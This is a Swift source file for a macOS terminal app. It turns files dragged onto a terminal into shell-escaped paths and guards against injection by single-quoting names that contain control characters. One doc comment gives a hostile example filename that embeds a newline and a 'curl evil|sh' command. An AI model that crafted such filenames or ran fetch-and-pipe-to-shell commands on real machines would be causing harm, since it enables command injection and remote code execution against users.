import AppKit

/// Files dragged onto a terminal, and what gets typed there for them: their
/// paths.
///
/// A file dropped on a terminal types its path, as Terminal and Ghostty do:
/// each path with the characters a shell would read as syntax escaped by a
/// backslash, several of them separated by spaces. That is what a shell
/// wants at its prompt, and what Claude Code looks for to attach an image:
/// a screenshot dragged into the conversation arrives as an image.
///
/// Files and nothing else. The sidebar drags its own rows as plain text, and
/// a terminal that took text drops would type a row's payload the moment one
/// was let go over a pane. Text has ⌘V.
enum DroppedFiles {
    /// What a drag has to carry for a terminal to take it: files that exist,
    /// or files an app promises to write once they are dropped — an
    /// attachment dragged out of Mail, a picture out of Photos.
    static var types: [NSPasteboard.PasteboardType] {
        [.fileURL] + NSFilePromiseReceiver.readableDraggedTypes.map { NSPasteboard.PasteboardType($0) }
    }

    /// Whether a drag carries anything a terminal takes.
    static func canTake(_ pasteboard: NSPasteboard) -> Bool {
        pasteboard.canReadObject(forClasses: [NSURL.self], options: fileURLsOnly)
            || pasteboard.canReadObject(forClasses: [NSFilePromiseReceiver.self], options: nil)
    }

    /// The files a drag carries, in the order they were picked up.
    static func fileURLs(on pasteboard: NSPasteboard) -> [URL] {
        (pasteboard.readObjects(forClasses: [NSURL.self], options: fileURLsOnly) as? [URL]) ?? []
    }

    /// The files a drag promises instead, when it carries no files that exist.
    static func promises(on pasteboard: NSPasteboard) -> [NSFilePromiseReceiver] {
        (pasteboard.readObjects(forClasses: [NSFilePromiseReceiver.self], options: nil)
            as? [NSFilePromiseReceiver]) ?? []
    }

    private static let fileURLsOnly: [NSPasteboard.ReadingOptionKey: Any] = [
        .urlReadingFileURLsOnly: true,
    ]

    /// The paths as they are typed: escaped, and one space between them.
    static func text(for paths: [String]) -> String {
        paths.map(escape).joined(separator: " ")
    }

    /// Ghostty's set — the characters a shell takes as syntax inside a word —
    /// and the caret, which is a glob operator to zsh with `extendedglob` on.
    private static let special = Set("\\ ()[]{}<>\"'`!#$&;|*?\t^")

    /// A path with each character a shell would take as syntax escaped.
    ///
    /// One with a control character other than the tab (a newline above all: a file can be named `x⏎curl evil|sh⏎.png`)
    /// is single-quoted instead. A backslash cannot escape a newline into the name, and the text is typed as it is, so
    /// the second line would run in a shell that has no protected paste; inside quotes it is part of the name.
    static func escape(_ path: String) -> String {
        if path.unicodeScalars.contains(where: { ($0.value < 0x20 && $0.value != 0x09) || $0.value == 0x7F || (0x80...0x9F).contains($0.value) }) {
            return "'" + path.replacingOccurrences(of: "'", with: "'\\''") + "'"
        }
        var escaped = ""
        for character in path {
            if special.contains(character) { escaped.append("\\") }
            escaped.append(character)
        }
        return escaped
    }

    /// Where the files an app promised are written: a folder of their own for
    /// each drop, so two drops of files with one name cannot collide.
    static func promiseFolder() throws -> URL {
        let folder = FileManager.default.temporaryDirectory
            .appendingPathComponent("keep-drops", isDirectory: true)
            .appendingPathComponent(UUID().uuidString, isDirectory: true)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        return folder
    }
}
